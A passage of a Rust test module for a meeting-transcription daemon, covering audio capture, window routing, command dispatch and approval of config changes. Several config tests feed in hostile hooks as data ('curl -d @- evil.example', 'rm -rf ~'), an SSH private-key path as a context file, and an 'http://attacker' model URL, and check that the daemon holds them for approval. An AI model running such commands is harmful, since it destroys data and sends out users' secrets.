            .map(<[i16]>::to_vec)
            .collect()
    }

    /// Three devices; logs every capture it builds and each echo cancellation.
    /// Its sources hear the speech fixture when `speech`, and end at once
    /// otherwise; cancelling the echo fails when `echo_fails`.
    #[derive(Default)]
    struct FakeAudio {
        captured: Mutex<Vec<String>>,
        speech: bool,
        echo_fails: bool,
    }

    impl FakeAudio {
        fn source(&self, name: String) -> Box<dyn AudioSource> {
            self.captured.lock().unwrap().push(name);
            Box::new(Clip(if self.speech { speech() } else { Vec::new() }))
        }
    }

    impl AudioDevices for FakeAudio {
        fn list(&self) -> BoxFuture<'static, Vec<Device>> {
            let devices = vec![
                Device::new("@default-input", "Mic", "input"),
                Device::new("@default-output", "Out", "output"),
                Device::new("usb-mic", "USB", "input"),
            ];
            async move { devices }.boxed()
        }

        fn capture(&self, device: &Device) -> Box<dyn AudioSource> {
            self.source(device.id.clone())
        }

        fn capture_cancelled(&self) -> Box<dyn AudioSource> {
            self.source("cancelled".into())
        }

        fn cancel_echo(&self, mic: &str) -> BoxFuture<'static, Result<EchoCancelling, AudioError>> {
            self.captured.lock().unwrap().push(format!("echo {mic}"));
            let fails = self.echo_fails;
            async move {
                match fails {
                    true => Err(AudioError("no echo-cancel module".into())),
                    false => Ok(Box::new(()) as EchoCancelling),
                }
            }
            .boxed()
        }
    }

    #[tokio::test]
    async fn inputs_skip_and_report_disconnected_devices() {
        let mut raw = raw();
        raw["colors"] = json!({"@default-input": "#ff4fd8"});
        let config = Config::from_value(raw).unwrap();
        let (emit, events) = recorder();
        let audio = FakeAudio::default();
        let found = inputs(&config, None, &audio, &audio.list().await, &emit);
        let found: Vec<_> = found
            .iter()
            .map(|i| (i.id.as_str(), i.participant.as_str(), i.color.as_deref()))
            .collect();
        assert_eq!(
            found,
            [
                ("@default-input", "Eu", Some("#ff4fd8")),
                ("@default-output", "Recrutador", None),
            ]
        );
        assert_eq!(
            *audio.captured.lock().unwrap(),
            ["@default-input", "@default-output"]
        );
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["code"], "input.disconnected");
        assert_eq!(
            events[0]["params"],
            json!({"participant": "Recrutador", "device": "alsa_output.usb-G522"})
        );
    }

    #[tokio::test]
    async fn replay_goes_to_the_first_participant_that_is_not_the_user() {
        let config = Config::from_value(raw()).unwrap();
        let (emit, _) = recorder();
        let audio = FakeAudio::default();
        let found = inputs(&config, Some(Path::new("dir/x.wav")), &audio, &[], &emit);
        assert_eq!(found.len(), 1);
        let replay = &found[0];
        assert_eq!(
            (&*replay.id, &*replay.label, &*replay.participant),
            ("replay", "x.wav", "Recrutador")
        );
        assert!(audio.captured.lock().unwrap().is_empty());
    }

    #[tokio::test]
    async fn echo_is_cancelled_on_the_users_first_microphone() {
        let mut raw = raw();
        raw["audio"] = json!({"echo_cancel": true});
        raw["participants"][0]["devices"] = json!(["usb-mic", "@default-input"]);
        let config = Config::from_value(raw).unwrap();
        let (emit, _) = recorder();
        let audio = FakeAudio::default();
        let found = inputs(&config, None, &audio, &audio.list().await, &emit);
        let cancelled: Vec<_> = found
            .iter()
            .map(|i| (i.id.as_str(), i.cancelled.is_some()))
            .collect();
        assert_eq!(
            cancelled,
            [
                ("usb-mic", true),
                ("@default-input", false),
                ("@default-output", false),
            ]
        );
        assert_eq!(
            audio
                .captured
                .lock()
                .unwrap()
                .iter()
                .filter(|c| *c == "cancelled")
                .count(),
            1
        );
    }

    type Log = Arc<Mutex<Vec<String>>>;

    /// Logs `<name> stopped` when dropped.
    struct Sessiond(Log, &'static str);

    impl Drop for Sessiond {
        fn drop(&mut self) {
            self.0.lock().unwrap().push(format!("{} stopped", self.1));
        }
    }

    struct Forever(Log);

    impl Work for Forever {
        fn run(
            &mut self,
            listening: Option<watch::Receiver<BTreeSet<Listening>>>,
        ) -> BoxFuture<'_, Result<(), AudioError>> {
            let name = if listening.is_some() {
                "capture"
            } else {
                "monitor"
            };
            self.0.lock().unwrap().push(format!("{name} started"));
            let sessiond = Sessiond(Arc::clone(&self.0), name);
            // Runs until dropped, and says so.
            let running = std::future::pending::<Result<(), AudioError>>();
            Box::pin(running.map(move |ran| ran.map(|()| drop(sessiond))))
        }
    }

    fn listening(names: &[&str]) -> BTreeSet<Listening> {
        let one = |model: &&str| Listening {
            model: model.to_string(),
            language: "pt".into(),
        };
        names.iter().map(one).collect()
    }

    #[tokio::test]
    async fn the_capture_follows_the_recording_sessions_until_none_can_record() {
        let log = Log::default();
        let (recording, watched) = watch::channel(BTreeSet::new());
        let (emit, _) = recorder();
        let mut work = Forever(Arc::clone(&log));
        let follower = tokio::spawn(async move {
            follow_recording(watched, &mut work, &emit).await;
        });
        tokio::time::sleep(Duration::from_millis(10)).await;
        recording.send_replace(listening(&["deepgram"]));
        tokio::time::sleep(Duration::from_millis(10)).await;
        // A second session listening with another model keeps the capture running.
        recording.send_replace(listening(&["deepgram", "whisper"]));
        tokio::time::sleep(Duration::from_millis(10)).await;
        drop(recording);
        follower.await.unwrap();
        assert_eq!(
            *log.lock().unwrap(),
            [
                "monitor started",
                "monitor stopped",
                "capture started",
                "capture stopped"
            ]
        );
    }

    struct Failing;

    impl Work for Failing {
        fn run(
            &mut self,
            _: Option<watch::Receiver<BTreeSet<Listening>>>,
        ) -> BoxFuture<'_, Result<(), AudioError>> {
            Box::pin(async { Err(AudioError("pw-record exited".into())) })
        }
    }

    #[tokio::test]
    async fn a_capture_that_dies_is_reported() {
        let (recording, watched) = watch::channel(listening(&["deepgram"]));
        let (emit, events) = recorder();
        let follower = tokio::spawn(async move {
            follow_recording(watched, &mut Failing, &emit).await;
        });
        tokio::time::sleep(Duration::from_millis(10)).await;
        drop(recording);
        follower.await.unwrap();
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["code"], "capture.stopped");
        assert_eq!(events[0]["params"]["detail"], "pw-record exited");
    }

    #[tokio::test]
    async fn a_replacement_starts_once_the_previous_pipeline_is_gone() {
        let log = Log::default();
        let sessiond = Sessiond(Arc::clone(&log), "old");
        let running = std::future::pending::<()>();
        let previous = tokio::spawn(running.map(move |()| drop(sessiond)));
        tokio::task::yield_now().await;
        stop(Some(previous)).await;
        log.lock().unwrap().push("new started".into());
        assert_eq!(*log.lock().unwrap(), ["old stopped", "new started"]);
    }

    #[test]
    fn a_window_tells_the_session_it_shows() {
        assert_eq!(
            window_shows(r#"{"window": 2, "session": "abc"}"#),
            Some((2, "abc".to_string()))
        );
        assert_eq!(
            window_shows(r#"{"window": 1, "session": ""}"#),
            Some((1, String::new()))
        );
        assert_eq!(window_shows(r#"{"session": "abc"}"#), None);
    }

    #[test]
    fn a_window_call_names_a_known_call_and_only_import_takes_a_path() {
        assert_eq!(
            window_call(r#"{"call": "config"}"#),
            Some(json!({"call": "config"}))
        );
        assert_eq!(
            window_call(r#"{"call": "import", "path": "/tmp/retro.vtt"}"#),
            Some(json!({"call": "import", "path": "/tmp/retro.vtt"}))
        );
        assert_eq!(
            window_call(r#"{"call": "import"}"#),
            Some(json!({"call": "import"}))
        );
        assert_eq!(window_call(r#"{"call": "sessions", "path": "/x"}"#), None);
        assert_eq!(window_call(r#"{"call": "import", "path": 3}"#), None);
        assert_eq!(window_call(r#"{"call": "quit"}"#), None);
        assert_eq!(window_call("sessions"), None);
    }

    #[test]
    fn a_window_call_goes_to_the_newest_window_or_opens_one() {
        let call = json!({"call": "import", "path": "/tmp/retro.vtt"});
        assert_eq!(
            route_call(Some(3), call.clone()),
            CallTo::Window(
                3,
                Some(json!({
                    "type": "window_call",
                    "window": 3,
                    "call": "import",
                    "path": "/tmp/retro.vtt"
                }))
            )
        );
        // No window is open, so one opens to make the call.
        assert_eq!(
            route_call(None, call.clone()),
            CallTo::NewWindow(Some(call.to_string()))
        );
    }

    #[test]
    fn focus_only_focuses_the_newest_window_or_opens_one() {
        let focus = window_call(r#"{"call": "focus"}"#).unwrap();
        assert_eq!(route_call(Some(2), focus.clone()), CallTo::Window(2, None));
        assert_eq!(route_call(None, focus), CallTo::NewWindow(None));
    }

    #[test]
    fn commands_split_into_verb_and_rest() {
        assert_eq!(split("ask  what now? "), ("ask", Some("what now? ")));
        assert_eq!(split("sessions"), ("sessions", None));
        assert_eq!(split("ask   "), ("ask", None));
    }

    #[tokio::test]
    async fn models_report_a_bad_request_to_its_target() {
        let event = models(r#"{"target": "llm"}"#, &[]).await;
        assert_eq!(
            event,
            json!({"type": "models", "target": "llm", "models": [], "error": "missing base_url"})
        );
    }

    /// The config `raw()` with an action `minutes` whose hook is `hook`, and a
    /// context file `cv.md`.
    fn with_hook(hook: &str) -> Value {
        let mut raw = raw();
        raw["actions"] = json!([{"name": "minutes", "prompt": "p", "format": "f", "hook": hook}]);
        raw["context"] = json!({"files": ["~/cv.md"]});
        raw
    }

    /// The config a change adopts, or the config and event it is held with.
    fn outcome(change: ConfigChange) -> Result<Config, Box<(Config, Value)>> {
        match change {
            ConfigChange::Adopt { config, .. } => Ok(config.unwrap()),
            ConfigChange::Hold(config, event) => Err(Box::new((config, event))),
        }
    }

    fn held(change: ConfigChange) -> Value {
        outcome(change).unwrap_err().1
    }

    fn adopted(change: ConfigChange) -> Config {
        outcome(change).unwrap()
    }

    #[test]
    fn a_window_saves_hooks_and_context_files_at_once() {
        let current = Config::from_value(raw()).unwrap();
        let mut request = with_hook("notify-send done");
        request["token"] = json!("secret");
        let config = adopted(config_change(&current, "secret", &request.to_string()));
        assert_eq!(config.actions[0].hook, "notify-send done");
        assert_eq!(config.context_files, ["~/cv.md"]);
    }

    #[test]
    fn another_client_adding_a_hook_or_a_file_is_held_naming_them() {
        let current = Config::from_value(raw()).unwrap();
        let mut request = with_hook("curl -d @- evil.example");
        request["contexts"] = json!([{"name": "keys", "files": ["~/.ssh/id_ed25519", "~/cv.md"]}]);
        let event = held(config_change(&current, "secret", &request.to_string()));
        assert_eq!(
            event,
            json!({
                "type": "config_pending",
                "hooks": [{"action": "minutes", "command": "curl -d @- evil.example"}],
                "files": ["~/cv.md", "~/.ssh/id_ed25519"],
                "models": [],
            })
        );
        // A wrong token is another client's.
        request["token"] = json!("guess");
        held(config_change(&current, "secret", &request.to_string()));
    }

    #[test]
    fn another_client_changing_a_hook_is_held_and_keeping_it_is_not() {
        let current = Config::from_value(with_hook("notify-send done")).unwrap();
        let changed = with_hook("rm -rf ~");
        let event = held(config_change(&current, "secret", &changed.to_string()));
        assert_eq!(
            event["hooks"],
            json!([{"action": "minutes", "command": "rm -rf ~"}])
        );
        assert_eq!(event["files"], json!([]));
        let mut kept = with_hook("notify-send done");
        kept["rules"] = json!("short answers");
        let config = adopted(config_change(&current, "secret", &kept.to_string()));
        assert_eq!(config.rules, "short answers");
    }

    #[test]
    fn another_client_adding_a_model_or_moving_its_key_is_held_naming_where() {
        let current = Config::from_value(raw()).unwrap();
        let mut added = raw();
        added["models"].as_array_mut().unwrap().push(json!({
            "name": "x", "type": "chat", "base_url": "http://attacker", "model": "m",
            "api_key_env": "OPENROUTER_API_KEY",
        }));
        let event = held(config_change(&current, "secret", &added.to_string()));
        let x = json!({"name": "x", "base_url": "http://attacker", "api_key_env": "OPENROUTER_API_KEY", "api_key_omapass": null});
        assert_eq!(event["models"], json!([x]));
        let mut moved = raw();
        moved["models"][1]["base_url"] = json!("http://attacker");
        let event = held(config_change(&current, "secret", &moved.to_string()));
        assert_eq!(event["models"][0]["name"], "m");
        let mut keyed = raw();
        keyed["models"][1]["api_key_omapass"] = json!("openrouter");
        let event = held(config_change(&current, "secret", &keyed.to_string()));
        assert_eq!(event["models"][0]["api_key_omapass"], "openrouter");
        // The provider's id for a known model is the user's to change from anywhere.
        let mut renamed = raw();
        renamed["models"][1]["model"] = json!("other");
        adopted(config_change(&current, "secret", &renamed.to_string()));
        // The window's own save adds a model at once.
        added["token"] = json!("secret");
        adopted(config_change(&current, "secret", &added.to_string()));
    }

    /// A held change of `raw()` with a hook running `hook`.
    fn hold(pending: &mut Pending, hook: &str) -> Value {
        let current = Config::from_value(raw()).unwrap();
        let change = config_change(&current, "secret", &with_hook(hook).to_string());
        let (config, event) = *outcome(change).unwrap_err();
        pending.hold(config, event)
    }

    #[test]
    fn approving_with_the_held_id_takes_that_change() {
        let mut pending = Pending::default();
        let event = hold(&mut pending, "notify-send done");
        assert_eq!(pending.event(), Some(event.clone()));
        let id = event["id"].as_str().unwrap();
        let config = pending.take(id).expect("the held change");
        assert_eq!(config.actions[0].hook, "notify-send done");
        assert_eq!(pending.event(), None);
        assert!(pending.take(id).is_none());
    }

    #[test]
    fn another_id_takes_nothing_and_keeps_the_held_change() {
        let mut pending = Pending::default();
        let event = hold(&mut pending, "notify-send done");
        for wrong in ["", "0", "2", "x", "01"] {
            assert!(pending.take(wrong).is_none(), "{wrong:?}");
        }
        assert_eq!(pending.event(), Some(event));
    }

    #[test]
    fn a_held_change_is_not_replaced_and_only_the_window_saves_meanwhile() {
        let mut pending = Pending::default();
        let current = Config::from_value(raw()).unwrap();
        let mut request = with_hook("curl -d @- evil.example");
        let newer = config_change(&current, "secret", &request.to_string());
        let harmless = config_change(&current, "secret", &raw().to_string());
        assert!(pending.admits(&newer) && pending.admits(&harmless));
        let event = hold(&mut pending, "notify-send done");
        assert!(!pending.admits(&newer));
        assert!(!pending.admits(&harmless));
        request["token"] = json!("secret");
        assert!(pending.admits(&config_change(&current, "secret", &request.to_string())));
        assert_eq!(pending.event(), Some(event));
    }

    #[test]
    fn a_newer_held_change_never_reuses_an_old_id() {
        let mut pending = Pending::default();
        let first = hold(&mut pending, "notify-send done");
        assert!(pending.clear());
        let second = hold(&mut pending, "curl -d @- evil.example");
        assert_ne!(first["id"], second["id"]);
        // The id the user saw for the first change does not approve the second.
        assert!(pending.take(first["id"].as_str().unwrap()).is_none());
        let config = pending.take(second["id"].as_str().unwrap()).unwrap();
        assert_eq!(config.actions[0].hook, "curl -d @- evil.example");
    }

    /// The first event `wanted` picks, once it is emitted.
    async fn until(events: &Mutex<Vec<Value>>, wanted: impl Fn(&Value) -> bool) -> Value {
        let deadline = std::time::Instant::now() + Duration::from_secs(20);
        loop {
            let found = events.lock().unwrap().iter().find(|e| wanted(e)).cloned();
            if let Some(event) = found {
                return event;
            }
            let waiting = std::time::Instant::now() < deadline;
            assert!(waiting, "never emitted: {:?}", events.lock().unwrap());
            tokio::time::sleep(Duration::from_millis(5)).await;
        }
    }

    /// An assistant with no session log and its people in `dir`.
    fn assistant(emit: &Emit, dir: &Path) -> Assistant {
        let people = PeopleFiles::new(dir.join("people"));
        Assistant::new(
            Arc::clone(emit),
            Arc::new(NoSessionFiles),
            Arc::new(people),
            Arc::new(ShellHooks),
        )
    }

    /// A streaming transcription that refuses every connection while `down`,
    /// and otherwise takes the audio and hears nothing in it.
    struct Flaky(Arc<AtomicBool>);

    impl StreamingSpeechToText for Flaky {
        fn transcribe<'a>(
            &'a self,
            frames: stream::BoxStream<'a, Frame>,
        ) -> stream::BoxStream<'a, Result<Heard, TranscriptionError>> {
            if self.0.load(Ordering::Relaxed) {
                let refused = TranscriptionError("refused".into());
                return stream::iter([Err(refused)]).boxed();
            }
            frames.filter_map(|_| async { None }).boxed()
        }
    }

    /// The transcriber of the input "mic", heard as "Eles", on `stt`.
    fn transcribing(
        stt: Stt,
        assistant: &Assistant,
        emit: &Emit,
        outages: &Outages,
    ) -> (Capture, JoinHandle<()>) {
        let mut hub = Hub::default();
        let capture = hub.input("mic");
        let reader = hub.read("mic").unwrap();
        let cell: Ready = Arc::new(OnceCell::new_with(Some(Ok(stt))));
        let listening = Listening {
            model: "w".into(),
            language: "pt".into(),
        };
        let running = tokio::spawn(transcriber(
            "Eles".into(),
            reader,
            (Arc::default(), cell),
            listening,
            assistant.clone(),
            (Arc::clone(emit), outages.clone()),
            None,
        ));
        (capture, running)
    }

    fn told(greeting: &Greeting) -> Vec<Value> {
        let events = greeting();
        events
            .into_iter()
            .filter(|event| event["type"] == "transcription")
            .collect()
    }

    #[tokio::test(start_paused = true)]
    async fn a_client_that_connects_while_a_source_is_down_is_told_until_it_is_back() {
        let dir = tempfile::tempdir().unwrap();
        let (emit, events) = recorder();
        let assistant = assistant(&emit, dir.path());
        let outages = Outages::default();
        let greeting = greeting(
            assistant.clone(),
            Arc::default(),
            outages.clone(),
            Arc::default(),
        );
        let down = Arc::new(AtomicBool::new(true));
        let stt = Stt::Stream(Box::new(Flaky(Arc::clone(&down))));
        let (capture, _running) = transcribing(stt, &assistant, &emit, &outages);
        capture.send(Captured::Frame(0, vec![0; FRAME_SAMPLES]));
        until(&events, |event| event["state"] == "down").await;
        assert_eq!(
            told(&greeting),
            [
                json!({"type": "transcription", "who": "Eles", "state": "down",
                    "code": "stt.down", "detail": "refused"})
            ]
        );
        down.store(false, Ordering::Relaxed);
        capture.send(Captured::Frame(1, vec![0; FRAME_SAMPLES]));
        until(&events, |event| event["state"] == "back").await;
        assert_eq!(told(&greeting), [] as [Value; 0]);
    }

    #[tokio::test(start_paused = true)]
    async fn a_source_no_one_transcribes_any_more_is_not_told_down() {
        let dir = tempfile::tempdir().unwrap();
        let (emit, events) = recorder();
        let assistant = assistant(&emit, dir.path());
        let outages = Outages::default();
        let greeting = greeting(
            assistant.clone(),
            Arc::default(),
            outages.clone(),
            Arc::default(),
        );
        let stt = Stt::Stream(Box::new(Flaky(Arc::new(AtomicBool::new(true)))));
        let (_capture, running) = transcribing(stt, &assistant, &emit, &outages);
        until(&events, |event| event["state"] == "down").await;
        assert_eq!(told(&greeting).len(), 1);
        stop(Some(running)).await;
        assert_eq!(told(&greeting), [] as [Value; 0]);
    }

    /// The VAD model `mise run setup` downloads, loaded once.
    fn vad() -> SileroModel {
        static VAD: std::sync::OnceLock<SileroModel> = std::sync::OnceLock::new();
        let load = || SileroModel::load(&paths::vad_model()).expect("run `mise run setup`");
        VAD.get_or_init(load).clone()
    }

    /// The windows open, each its number and the session it shows, and what was
    /// asked of them; while `refuse`, none opens or takes the keyboard.
    #[derive(Default)]
    struct Desk {
        open: Vec<(u32, String)>,
        last: u32,
        asked: Vec<String>,
        refuse: bool,
        hidden: Option<bool>,
    }

    /// Windows on a `Desk`; one exits for each status sent to `exits`.
    struct FakeWindows {
        desk: Arc<Mutex<Desk>>,
        exits: mpsc::UnboundedReceiver<ExitStatus>,
    }

    impl Overlay for FakeWindows {
        fn shown(&self) -> Vec<String> {
            let desk = self.desk.lock().unwrap();
            desk.open.iter().map(|(_, shows)| shows.clone()).collect()
        }

        fn newest(&self) -> Option<u32> {
            self.desk
                .lock()
                .unwrap()
                .open
                .last()
                .map(|(number, _)| *number)
        }

        fn is_open(&self) -> bool {
            !self.desk.lock().unwrap().open.is_empty()
        }

        fn open<'a>(
            &'a mut self,
            show: Option<&'a str>,
            call: Option<&'a str>,
        ) -> BoxFuture<'a, io::Result<()>> {
            let mut desk = self.desk.lock().unwrap();
            let (show, call) = (show.unwrap_or_default(), call.unwrap_or_default());
            desk.asked.push(format!("open {show} {call}"));
            let opened = (!desk.refuse).then(|| {
                desk.last += 1;
                let number = desk.last;
                desk.open.push((number, show.to_string()));
            });
            let opened = opened.ok_or_else(|| io::Error::other("eco-window exited with 1"));
            Box::pin(async move { opened })
        }

        fn focus(&self, number: u32) -> BoxFuture<'_, io::Result<()>> {
            let mut desk = self.desk.lock().unwrap();
            desk.asked.push(format!("focus {number}"));
            let focused = match desk.refuse {
                true => Err(io::Error::other("no window to focus")),
                false => Ok(()),
            };
            Box::pin(async move { focused })
        }

        fn shows(&mut self, number: u32, session: &str) {
            let mut desk = self.desk.lock().unwrap();
            for (open, shows) in &mut desk.open {
                if *open == number {
                    *shows = session.to_string();
                }
            }
        }

        fn hide_from_share(&mut self, hidden: bool) -> BoxFuture<'_, ()> {
            self.desk.lock().unwrap().hidden = Some(hidden);
            Box::pin(async {})
        }

        fn exited(&mut self) -> BoxFuture<'_, Option<ExitStatus>> {
            Box::pin(async move {
                let status = self.exits.recv().await.expect("the test holds the sender");
                self.desk.lock().unwrap().open.remove(0);
                Some(status)
            })
        }

        fn close(self: Box<Self>) -> BoxFuture<'static, ()> {
            self.desk.lock().unwrap().asked.push("close".into());
            Box::pin(async {})
        }
    }

    /// A session served against fakes, its files in `dir`.
    struct Daemon {
        session: Session,
        events: Arc<Mutex<Vec<Value>>>,
        desk: Arc<Mutex<Desk>>,
        exits: mpsc::UnboundedSender<ExitStatus>,
        dir: tempfile::TempDir,
    }

    /// Diarizes nothing: no speaker model is set up.
    fn no_diarizer() -> Diarizer {
        Arc::new(|_| None)
    }

    fn daemon(raw: Value) -> Daemon {
        daemon_on(raw, Arc::new(FakeAudio::default()), no_diarizer())
    }

    fn daemon_on(raw: Value, audio: Arc<FakeAudio>, diarizer: Diarizer) -> Daemon {
        let dir = tempfile::tempdir().unwrap();
        let (emit, events) = recorder();
        let log: Arc<dyn SessionLog> = Arc::new(SessionFiles::new(dir.path().join("sessions")));
        let people: Arc<dyn PeopleStore> = Arc::new(PeopleFiles::new(dir.path().join("people")));
        let assistant = Assistant::new(
            Arc::clone(&emit),
            Arc::clone(&log),
            Arc::clone(&people),
            Arc::new(ShellHooks),
        );
        let desk: Arc<Mutex<Desk>> = Arc::default();
        let (exits, exited) = mpsc::unbounded_channel();
        let session = Session {
            config_path: dir.path().join("config.toml"),
            current: Config::from_value(raw).unwrap(),
            token: "secret".into(),
            pending: Arc::default(),
            rig: Rig {
                replay: None,
                audio,
                vad: vad(),
                diarizer,
                outages: Outages::default(),
            },
            assistant,
            emit,
            pipeline: None,
            background: JoinSet::new(),
            log,
            people,
            importing: None,
            windows: Box::new(FakeWindows {
                desk: Arc::clone(&desk),
                exits: exited,
            }),
            overlay_open: Arc::default(),
        };
        Daemon {
            session,
            events,
            desk,
            exits,
            dir,
        }
    }

    /// Each event's code when it is an error, its type otherwise.
    fn said(events: &[Value]) -> Vec<String> {
        let name = |event: &Value| event.get("code").unwrap_or(&event["type"]).clone();
        events
            .iter()
            .map(|event| name(event).as_str().unwrap_or_default().to_string())
            .collect()
    }

    impl Daemon {
        /// Handle `line`; every event it emitted at once.
        async fn line(&mut self, line: &str) -> Vec<Value> {
            self.events.lock().unwrap().clear();
            assert!(self.session.handle(line).await, "{line} stopped the daemon");
            self.events.lock().unwrap().clone()
        }

        /// The first event `wanted` picks, once it is emitted.
        async fn until(&self, wanted: impl Fn(&Value) -> bool) -> Value {
            until(&self.events, wanted).await
        }

        fn asked(&self) -> Vec<String> {
            self.desk.lock().unwrap().asked.clone()
        }

        /// Start a live session titled `title`; its id.
        async fn start(&mut self, title: &str) -> String {
            let start = json!({"language": "pt", "title": title});
            let events = self.line(&format!("session.start {start}")).await;
            events[0]["session"]["id"].as_str().unwrap().to_string()
        }

        /// Run the pipeline of the current config; its snapshot.
        async fn configured(&mut self) -> Value {
            self.session.restart().await;
            self.until(|event| event["type"] == "snapshot").await
        }
    }

    #[tokio::test]
    async fn every_command_reaches_the_assistant_with_its_fields() {
        let mut d = daemon(raw());
        let id = d.start("Retro").await;
        // Each line, what it emits, and one field that shows what it was given.
        let cases: Vec<(String, Vec<&str>, &str, Value)> = vec![
            (
                "note remember this".into(),
                vec!["note"],
                "/0/text",
                json!("remember this"),
            ),
            (
                "action probe".into(),
                vec!["action.unknown"],
                "/0/params/name",
                json!("probe"),
            ),
            (
                format!(r#"session.language {{"id": "{id}", "language": "EN "}}"#),
                vec!["session.invalid"],
                "/0/params/detail",
                json!("no language \"en\""),
            ),
            (
                "session.pause".into(),
                vec!["session"],
                "/0/session/state",
                json!("paused"),
            ),
            (
                format!("session.resume {id} "),
                vec!["session"],
                "/0/session/state",
                json!("recording"),
            ),
            (
                "session.toggle".into(),
                vec!["session"],
                "/0/session/state",
                json!("paused"),
            ),
            (
                "sessions".into(),
                vec!["sessions"],
                "/0/sessions/0/id",
                json!(id),
            ),
            (
                "sessions.search retro".into(),
                vec!["sessions_found"],
                "/0/ids",
                json!([id]),
            ),
            (
                format!("session.show {id}"),
                vec!["session_detail"],
                "/0/session/id",
                json!(id),
            ),
            (
                format!("session.timeline {id}"),
                vec!["session_timeline"],
                "/0/timeline/0/text",
                json!("remember this"),
            ),
            (
                format!(r#"session.rename {{"id": "{id}", "title": "Retro Q3", "kind": "idea"}}"#),
                vec!["session.invalid"],
                "/0/params/detail",
                json!("unknown kind \"idea\""),
            ),
            ("tags".into(), vec!["tags"], "/0/tags", json!([])),
            (
                format!(r#"session.tag {{"id": "{id}", "tag": "q3"}}"#),
                vec!["session", "session_tags", "tags"],
                "/1/tags",
                json!(["q3"]),
            ),
            (
                format!(r#"session.untag {{"id": "{id}", "tag": "q3"}}"#),
                vec!["session", "session_tags", "tags"],
                "/1/tags",
                json!([]),
            ),
            (
                r#"tag.rename {"from": "q3", "to": "q4"}"#.into(),
                vec!["tag.not_found"],
                "/0/params/tag",
                json!("q3"),
            ),
            (
                r#"tag.delete {"tag": "q4"}"#.into(),
                vec!["tag.not_found"],
                "/0/params/tag",
                json!("q4"),
            ),
            (
                format!(r#"session.speaker {{"id": "{id}", "label": "Eles", "name": "Ana"}}"#),
                vec!["speaker_renamed"],
                "/0/name",
                json!("Ana"),
            ),
            (
                format!("session.speakers {id}"),
                vec!["session_speakers"],
                "/0/session",
                json!(id),
            ),
            (
                format!("session.cost {id}"),
                vec!["session_cost"],
                "/0/session",
                json!(id),
            ),
            (
                format!(
                    r#"session.line.edit {{"id": "{id}", "who": "Eu", "at": 1.5, "text": "oi"}}"#
                ),
                vec!["line.not_found"],
                "/0/params",
                json!({"id": id, "who": "Eu", "at": 1.5}),
            ),
            (
                format!(r#"session.line.remove {{"id": "{id}", "who": "Eu", "at": 2.5}}"#),
                vec!["line.not_found"],
                "/0/params/at",
                json!(2.5),
            ),
            ("people".into(), vec!["people"], "/0/people", json!([])),
            (
                "people.adopt".into(),
                vec!["people_adopted"],
                "/0/count",
                json!(0),
            ),
            (
                format!(r#"person.attend {{"session": "{id}", "person": "", "name": "Ana"}}"#),
                vec!["attendees_changed", "sessions", "people"],
                "/2/people/0/name",
                json!("Ana"),
            ),
            (
                format!(r#"person.leave {{"session": "{id}", "person": "p1"}}"#),
                vec!["person.not_found"],
                "/0/params/id",
                json!("p1"),
            ),
            (
                format!(
                    r##"person.assign {{"session": "{id}", "label": "Eles", "person": "", "name": "Bia", "color": "#ff0000"}}"##
                ),
                vec!["speaker.invalid"],
                "/0/message",
                json!("session has no matching speaker"),
            ),
            (
                format!(
                    r##"session.speaker_color {{"session": "{id}", "label": "Eles", "color": "#0000ff"}}"##
                ),
                vec!["speaker.invalid"],
                "/0/message",
                json!("speaker not found"),
            ),
            (
                format!(
                    r#"person.assign_line {{"id": "{id}", "who": "Eu", "at": 1.5, "person": "", "name": "Caio"}}"#
                ),
                vec!["line.not_found"],
                "/0/params/who",
                json!("Eu"),
            ),
            (
                format!(r#"person.assign_all {{"session": "{id}", "person": "", "name": "Duda"}}"#),
                vec!["speaker.invalid"],
                "/0/message",
                json!("session has no matching speaker"),
            ),
            (
                format!(r#"person.unassign {{"session": "{id}", "label": "Eles"}}"#),
                vec![
                    "speaker_renamed",
                    "session_speakers",
                    "attendees_changed",
                    "sessions",
                    "people",
                ],
                "/0/label",
                json!("Eles"),
            ),
            (
                format!(r#"session.context {{"id": "{id}", "contexts": ["cv"]}}"#),
                vec!["session_context"],
                "/0/contexts",
                json!(["cv"]),
            ),
            (
                format!(r#"person.guess.clear {{"session": "{id}", "label": "Eles"}}"#),
                vec!["speaker.invalid"],
                "/0/message",
                json!("the speaker has no guess to clear"),
            ),
            (
                r#"person.add {"name": "Eva"}"#.into(),
                vec!["people"],
                "/0/people/1/name",
                json!("Eva"),
            ),
            (
                r##"person.color {"person": "p4", "color": "#00ff00"}"##.into(),
                vec!["person.not_found"],
                "/0/params/id",
                json!("p4"),
            ),
            (
                r#"person.rename {"id": "p1", "name": "Eva"}"#.into(),
                vec!["person.not_found"],
                "/0/params/id",
                json!("p1"),
            ),
            (
                r#"person.merge {"into": "p1", "from": "p2"}"#.into(),
                vec!["person.not_found", "person.not_found"],
                "/1/params/id",
                json!("p2"),
            ),
            (
                "person.forget p3 ".into(),
                vec!["person.not_found"],
                "/0/params/id",
                json!("p3"),
            ),
            (
                r#"session.ask {"id": "nope", "question": "why?"}"#.into(),
                vec!["session.not_found"],
                "/0/params/id",
                json!("nope"),
            ),
            (
                format!(r#"session.note {{"id": "{id}", "text": "later"}}"#),
                vec!["note"],
                "/0/text",
                json!("later"),
            ),
            (
                format!(r#"session.action {{"id": "{id}", "name": "minutes"}}"#),
                vec!["action.unknown"],
                "/0/params/name",
                json!("minutes"),
            ),
            (
                format!(r#"hook.send {{"session": "{id}", "id": "e1"}}"#),
                vec!["answer.not_found"],
                "/0/params/id",
                json!("e1"),
            ),
            (
                format!(r#"entry.remove {{"session": "{id}", "id": "e2"}}"#),
                vec!["suggestion_removed"],
                "/0/id",
                json!("e2"),
            ),
            (
                format!("session.export {id}"),
                vec!["session_export"],
                "/0/text",
                json!("WEBVTT\n"),
            ),
            (
                "session.export nope".into(),
                vec!["session.not_found"],
                "/0/params/id",
                json!("nope"),
            ),
            (
                format!("session.end {id}"),
                vec!["session"],
                "/0/session",
                Value::Null,
            ),
            (
                format!("session.reopen {id}"),
                vec!["session"],
                "/0/session/state",
                json!("recording"),
            ),
            (
                format!("session.delete {id}"),
                vec!["session.live"],
                "/0/params/id",
                json!(id),
            ),
            (
                "dance with me".into(),
                vec!["command.unknown"],
                "/0/params/command",
                json!("dance with me"),
            ),
        ];
        for (line, expected, field, value) in cases {
            let events = d.line(&line).await;
            assert_eq!(said(&events), expected, "{line}");
            assert_eq!(json!(events).pointer(field), Some(&value), "{line}");
        }
        assert!(!d.session.handle("stop").await);
